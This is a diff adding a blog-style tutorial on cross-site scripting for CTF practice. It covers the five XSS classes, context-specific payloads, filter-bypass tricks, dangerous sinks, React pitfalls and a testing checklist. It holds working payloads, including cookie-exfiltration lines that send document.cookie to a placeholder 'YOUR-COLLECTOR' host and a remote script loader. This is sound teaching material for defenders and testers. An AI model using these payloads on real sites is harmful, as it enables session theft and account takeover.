@@ -1,0 +1,182 @@
+---
+title: "Cross-Site Scripting (XSS)"
+date: "2026-06-26"
+excerpt: "The five XSS classes, why injection context decides the payload, and the snippets that actually fire — plus the sink list, a detection flow, and a CTF testing checklist."
+tags: ["Web", "XSS", "CTF"]
+---
+
+XSS happens when user input is rendered into a page without escaping, so the browser interprets
+it as HTML/JavaScript instead of text. The injected code runs **in the victim's browser, under
+the site's origin** — which is why it inherits the victim's session.
+
+## What XSS gets you
+
+Scope depends on the app, but the usual prizes:
+
+- Read non-`HttpOnly` cookies; read/write `localStorage` and `sessionStorage`
+- Read and rewrite the DOM (deface, inject fake login forms for phishing)
+- Act as the logged-in user — fire same-origin requests with their session, defeating
+  most CSRF defenses from inside
+- In CTFs: exfiltrate the flag from the page, an admin's cookie, or an internal endpoint
+
+## The five classes
+
+### Reflected
+
+Input is echoed straight back in the response. Non-persistent — the victim has to open a
+crafted URL.
+
+```php
+// vulnerable: q is echoed unescaped
+<h1><?php echo $_GET['q']; ?></h1>
+```
+
+```text
+/search?q=<script>alert(document.domain)</script>
+```
+
+### Stored
+
+Input is saved server-side and replayed to everyone who views it. Persistent and high-impact —
+every visitor is a victim. Common sinks: comments, forum posts, usernames, profile bios, support
+tickets, chat.
+
+### DOM-based
+
+No server involvement — client-side JS takes attacker-controlled data from a *source* and writes
+it to a dangerous *sink*.
+
+```js
+// source: location.hash   →   sink: innerHTML
+element.innerHTML = location.hash.slice(1);   // vulnerable
+element.textContent = location.hash.slice(1); // safe — rendered as text
+```
+
+### Blind
+
+A stored payload that fires somewhere you can't see — an admin dashboard, moderation queue, log
+viewer, or support backend. You won't get immediate feedback, so use an out-of-band callback
+(e.g. an XSS-hunter style collector) to know when and where it executed.
+
+```html
+<script src="https://YOUR-COLLECTOR/x.js"></script>
+```
+
+### Mutation (mXSS)
+
+A sanitizer approves the input, but the browser *reparses* the HTML afterward and resurrects a
+dangerous element. The bypass lives in the gap between how the sanitizer reads the markup and how
+the browser re-serializes it — classically via `innerHTML` round-trips and quirky nesting.
+
+```text
+input → sanitizer thinks it's safe → browser reparses → dangerous node appears
+```
+
+Mostly advanced-CTF / research territory; the fix is sanitizing with a parser the browser agrees
+with (e.g. DOMPurify) rather than regex.
+
+## Context is everything
+
+The same payload won't fire everywhere — what you inject depends on where it lands. Identify the
+context first, then break out of it:
+
+```html
+<!-- HTML body: inject a tag directly -->
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+
+<!-- Inside an attribute value: close the attribute/tag first -->
+"><svg onload=alert(1)>
+" autofocus onfocus=alert(1) x="
+
+<!-- Inside a <script> string: break out of the string/statement -->
+';alert(1)//
+</script><svg onload=alert(1)>
+
+<!-- In an href/src (URL context): script-scheme -->
+javascript:alert(1)
+```
+
+When tags are filtered, lean on **attribute-based execution** (`onerror`, `onload`, `onfocus`,
+`onmouseover`) and tags that don't need a closing tag or user interaction (`<svg>`, `<img>`).
+For filter bypass: try case variation, missing quotes, no spaces (`/` as a separator), HTML-entity
+or URL encoding, and dropping `<script>` entirely in favor of event handlers.
+
+## Useful payloads
+
+```html
+<!-- proof of execution — prefer document.domain over alert(1) -->
+<script>alert(document.domain)</script>
+<svg onload=alert(document.domain)>
+
+<!-- read cookies -->
+<script>alert(document.cookie)</script>
+
+<!-- exfiltrate cookie out-of-band -->
+<script>new Image().src='https://YOUR-COLLECTOR/?c='+encodeURIComponent(document.cookie)</script>
+<script>fetch('https://YOUR-COLLECTOR/?c='+document.cookie)</script>
+
+<!-- no-interaction classics for filtered contexts -->
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+```
+
+## Dangerous sinks
+
+When user input reaches any of these, treat it as a potential XSS:
+
+```text
+innerHTML          outerHTML          document.write()
+insertAdjacentHTML()                  dangerouslySetInnerHTML  (React)
+eval()             new Function()
+setTimeout("…")    setInterval("…")   (string arguments)
+location / href / src   (URL context, javascript: scheme)
+```
+
+**Safe alternatives:** `textContent` instead of `innerHTML`; `createElement()` +
+`appendChild()` instead of `document.write()`; pass *functions*, not strings, to
+`setTimeout`/`setInterval`.
+
+## Framework note: React
+
+React escapes interpolated values by default, so `<div>{userInput}</div>` is safe. The escape
+hatches are where bugs live:
+
+- `dangerouslySetInnerHTML` — explicitly opts out of escaping; sanitize the HTML first.
+- `href` / `src` set from user input — a `javascript:` URL still executes; validate the scheme.
+
+## Detection methodology (CTF)
+
+1. **Enumerate every input** — search, login, profile, username, comments, messages, contact
+   forms, and URL parameters.
+2. **Find where it surfaces** — HTML body? attribute? inside `<script>`? a URL? That decides the
+   payload.
+3. **Test escaping** — inject `<b>x</b>`. If it renders as text (`&lt;b&gt;`), it's escaped; if
+   it becomes a real element, it's injectable.
+4. **Classify it** — immediate echo → reflected; saved in DB → stored; pure client-side JS → DOM;
+   only admins trigger → blind; sanitizer-then-reparse → mXSS.
+
+## Testing checklist
+
+- Search boxes and URL parameters
+- Profile fields, usernames, bios
+- Comments, feedback, contact and chat messages
+- Markdown editors and rendered previews
+- File names, PDF/preview generators
+- Admin dashboards, notifications, **error messages** (often reflected and forgotten)
+
+## Memory trick
+
+```text
+Reflected   comes back immediately in the response
+Stored      saved in the database, replayed to all
+DOM         client-side JS source → dangerous sink
+Blind       someone else (an admin) triggers it later
+mXSS        browser rewrites the HTML after sanitization
+```
+
+<Callout>
+A reference for authorized testing and CTF practice. Only run these against applications you own
+or have explicit written permission to test.
+</Callout>
